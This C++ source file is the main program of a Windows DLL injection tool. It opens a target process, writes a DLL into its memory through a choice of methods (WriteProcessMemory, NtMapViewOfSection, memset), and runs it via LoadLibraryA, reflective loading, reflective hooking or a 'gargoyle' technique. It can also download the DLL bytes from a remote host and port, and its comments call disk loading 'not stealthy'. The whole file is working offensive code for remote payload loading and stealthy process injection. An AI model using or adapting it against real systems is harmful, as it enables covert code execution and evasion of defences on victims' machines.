#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include "downloader.h"
#include "executors/executor.h"
#include "executors/gargoyle.h"
#include "executors/ll.h"
#include "executors/reflective_hooker.h"
#include "executors/reflective_loader.h"
#include "memory_writers/memory_writer.h"
#include "memory_writers/memset.h"
#include "memory_writers/ntmvos.h"
#include "memory_writers/wpm.h"
#include "util.h"
#include <cstring>
#include <fileapi.h>
#include <iostream>
#include <utility>
#include <windows.h>

void print_banner() {
  std::cout << "\n"
               "_,-'                \n"
               "  \\\\              \n"
               "   \\\\  ,            \n"
               "   _,-'\\           \n"
               "  '\\    \\           \n"
               "    \\    \\        \n"
               "     \\    \\         \n"
               "      \\_,-'\\      \n"
               "       \\_,-'\\       \n"
               "        \\_,-'\\    \n"
               "         \\_,-'      \n"
               "            \\\\    \n"
               "             \\\\   \n"
               "              \\\\  \n"
               "               \\\\ \n"
               "                \\| \n"
               "                 `  \n\n";
}

void print_usage() {
  std::cout << "Usage: dll_inject [options] --target <process>" << std::endl;
  std::cout << "\tOptions:" << std::endl;
  std::cout << "\t\t-e, --exec exec_mode" << std::endl;
  std::cout << "\t\t-w, --write write_mode" << std::endl;
  std::cout << "\t\t-d, --dll path_to_dll" << std::endl;
  std::cout << "\t\t-h, --host hostname" << std::endl;
  std::cout << "\t\t-p, --port port" << std::endl;
  std::cout << "\t\t-s, --stomp module" << std::endl;
  std::cout << std::endl;
  std::cout << "exec_mode can be:\n\t- 0 for LoadLibraryA method\n\t- 1 for "
               "reflective loading method\n\t- 2 for reflective hooking "
               "method\n\t- 3 for gargoyle"
            << std::endl;
  std::cout << "write_mode can be:\n\t- 0 for WriteProcessMemory method\n\t- 1 "
               "for NtMapViewOfSection method\n\t- 2 for memset() method"
            << std::endl;
}

const char *get_param(int argc, const char **argv, const char *short_option,
                      const char *long_option) {
  // iterate over all command line args
  for (int ii = 0; ii < argc; ii++) {
    // if matches long or short option, return argument after
    if (strcmp(argv[ii], short_option) == 0 ||
        strcmp(argv[ii], long_option) == 0) {
      // need to make sure we don't index past
      if (ii + 1 < argc) {
        return argv[ii + 1];
      }
    }
  }
  return NULL;
}

int main(int argc, const char **argv) {
  print_banner();

  const char *process_name = get_param(argc, argv, "-t", "--target");
  if (process_name == NULL) {
    std::cout << "Please supply the --target argument" << std::endl
              << std::endl;
    print_usage();
    return 1;
  }

  // user can supply --target with either pid or process name, need to
  // find out which, by checking if --target is entirely numeric
  BOOL using_pid = TRUE;

  size_t process_name_len = strlen(process_name);
  for (int ii = 0; ii < process_name_len; ii++) {
    if (!(process_name[ii] >= '0' && process_name[ii] <= '9')) {
      using_pid = FALSE;
      break;
    }
  }

  const char *exec_mode = get_param(argc, argv, "-e", "--exec");
  const char *write_mode = get_param(argc, argv, "-w", "--write");

  if (exec_mode == NULL || write_mode == NULL) {
    std::cout << "Please supply both --exec and --write options" << std::endl
              << std::endl;
    print_usage();
    return 1;
  }

  const char *dll_path = get_param(argc, argv, "-d", "--dll");
  const char *host = get_param(argc, argv, "-h", "--host");
  const char *port = get_param(argc, argv, "-p", "--port");
  const char *module_to_stomp = get_param(argc, argv, "-s", "--stomp");

  LPVOID data_to_write;
  SIZE_T data_size;
  Executor *ex = NULL;
  MemoryWriter *mw = NULL;
  HANDLE target_process;

  // WriteProcessMemory method
  if (strcmp(write_mode, "0") == 0) {
    target_process = open_process(
        process_name,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        using_pid);
    if (target_process == NULL) {
#ifdef DEBUG
      std::cerr << "Failed to open target process" << std::endl;
#endif
      return 1;
    }
    mw = new WPM(target_process);
  } else if (strcmp(write_mode, "1") == 0) {
    // stll need PROCESS_VM_WRITE for CreateUserThread(), maybe refactor to have
    // permissions based on execute method as well?
    target_process = open_process(
        process_name,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        using_pid);
    if (target_process == NULL) {
#ifdef DEBUG
      std::cerr << "Failed to open target process" << std::endl;
#endif
      return 1;
    }
    mw = new NTMVoS(target_process);
  } else if (strcmp(write_mode, "2") == 0) {
    // stll need PROCESS_VM_WRITE for CreateUserThread(), maybe refactor to have
    // permissions based on execute method as well?
    target_process = open_process(
        process_name,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        using_pid);
    if (target_process == NULL) {
#ifdef DEBUG
      std::cerr << "Failed to open target process" << std::endl;
#endif
      return 1;
    }
    mw = new Memset(target_process);
  }

  // LoadLibraryA method
  if (strcmp(exec_mode, "0") == 0) {
    if (dll_path == NULL) {
      std::cout << "If using LoadLibraryA executor mode, please supply the "
                   "--dll option";
      print_usage();
      return 1;
    }

    TCHAR full_dll_path[MAX_PATH];
    GetFullPathNameA(dll_path, MAX_PATH, full_dll_path, NULL);
    data_size = (DWORD)strlen(full_dll_path);
    data_to_write = (LPVOID)(&full_dll_path[0]);
    ex = new LL();
  }
  // reflective injection method
  else if (strcmp(exec_mode, "1") == 0) {
    // get dll bytes by downloading
    if (host != NULL && port != NULL) {
      if (dll_path != NULL) {
        std::cout
            << "Both (--host, --port) and --dll supplied, using --host --port";
      }
      std::pair<BYTE *, size_t> downloaded = download(host, port);
      if (downloaded.first == NULL) {
#ifdef DEBUG
        printf("Failed to download DLL bytes: %d\n", GetLastError());
#endif
        return 1;
      }

      data_to_write = (LPVOID)(downloaded.first);
      data_size = downloaded.second;
    }
    // get dll bytes from file
    else if (dll_path != NULL) {
#ifdef DEBUG
      printf("Loading DLL from disk. This is not recommended because it is not "
             "stealthy\n");
#endif
      TCHAR full_dll_path[MAX_PATH];
      GetFullPathNameA(dll_path, MAX_PATH, full_dll_path, NULL);
      HANDLE dll_handle =
          CreateFileA(full_dll_path, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL, NULL);
      DWORD dll_size = GetFileSize(dll_handle, NULL);
      BYTE *dll_bytes = new BYTE[dll_size];
      DWORD bytes_read;
      BOOL success = ReadFile(dll_handle, dll_bytes, dll_size, &bytes_read, 0);
      if (!(success) || bytes_read != dll_size) {
#ifdef DEBUG
        std::cerr << "Failed to read dll file" << std::endl;
#endif
        return 1;
      }
      data_to_write = (LPVOID)dll_bytes;
      data_size = dll_size;
    } else {
      std::cout << "Please supply either (--host, --port) or --dll with the "
                   "reflective loader"
                << std::endl;
    }

    ex = new ReflectiveLoader(module_to_stomp);
  }
  // reflective hooking method
  else if (strcmp(exec_mode, "2") == 0) {
    // get dll bytes by downloading
    if (host != NULL && port != NULL) {
      if (dll_path != NULL) {
        std::cout
            << "Both (--host, --port) and --dll supplied, using --host --port";
      }
      std::pair<BYTE *, size_t> downloaded = download(host, port);
      if (downloaded.first == NULL) {
#ifdef DEBUG
        printf("Failed to download DLL bytes: %d\n", GetLastError());
#endif
        return 1;
      }
      data_to_write = (LPVOID)(downloaded.first);
      data_size = downloaded.second;
    }
    // get dll bytes from file
    else if (dll_path != NULL) {
#ifdef DEBUG
      printf("Loading DLL from disk. This is not recommended because it is not "
             "stealthy.\n");
#endif
      TCHAR full_dll_path[MAX_PATH];
      GetFullPathNameA(dll_path, MAX_PATH, full_dll_path, NULL);
      HANDLE dll_handle =
          CreateFileA(full_dll_path, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL, NULL);
      DWORD dll_size = GetFileSize(dll_handle, NULL);
      BYTE *dll_bytes = new BYTE[dll_size];
      DWORD bytes_read;
      BOOL success = ReadFile(dll_handle, dll_bytes, dll_size, &bytes_read, 0);
      if (!(success) || bytes_read != dll_size) {
#ifdef DEBUG
        std::cerr << "Failed to read dll file" << std::endl;
#endif
        return 1;
      }
      data_to_write = (LPVOID)dll_bytes;
      data_size = dll_size;
    } else {
      std::cout << "Please supply either (--host, --port) or --dll with the "
                   "reflective hooker"
                << std::endl;
    }

    ex = new ReflectiveHooker(module_to_stomp);
  } else if (strcmp(exec_mode, "3") == 0) {
    // gargoyle
    if (host != NULL && port != NULL) {
      if (dll_path != NULL) {
        std::cout
            << "Both (--host, --port) and --dll supplied, using --host --port";
      }
      std::pair<BYTE *, size_t> downloaded = download(host, port);
      if (downloaded.first == NULL) {
#ifdef DEBUG
        printf("Failed to download DLL bytes: %d\n", GetLastError());
#endif
        return 1;
      }
      data_to_write = (LPVOID)(downloaded.first);
      data_size = downloaded.second;
    }
    // get dll bytes from file
    else if (dll_path != NULL) {
#ifdef DEBUG
      printf("Loading DLL from disk. This is not recommended because it is not "
             "stealthy.\n");
#endif
      TCHAR full_dll_path[MAX_PATH];
      GetFullPathNameA(dll_path, MAX_PATH, full_dll_path, NULL);
      HANDLE dll_handle =
          CreateFileA(full_dll_path, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL, NULL);
      DWORD dll_size = GetFileSize(dll_handle, NULL);
      BYTE *dll_bytes = new BYTE[dll_size];
      DWORD bytes_read;
      BOOL success = ReadFile(dll_handle, dll_bytes, dll_size, &bytes_read, 0);
      if (!(success) || bytes_read != dll_size) {
#ifdef DEBUG
        std::cerr << "Failed to read dll file" << std::endl;
#endif
        return 1;
      }
      data_to_write = (LPVOID)dll_bytes;
      data_size = dll_size;
    } else {
      std::cout
          << "Please supply either (--host, --port) or --dll with gargoyle"
          << std::endl;
    }

    ex = new Gargoyle();
  }

  ex->execute(mw, data_to_write, data_size);
  CloseHandle(target_process);
  return 0;
}
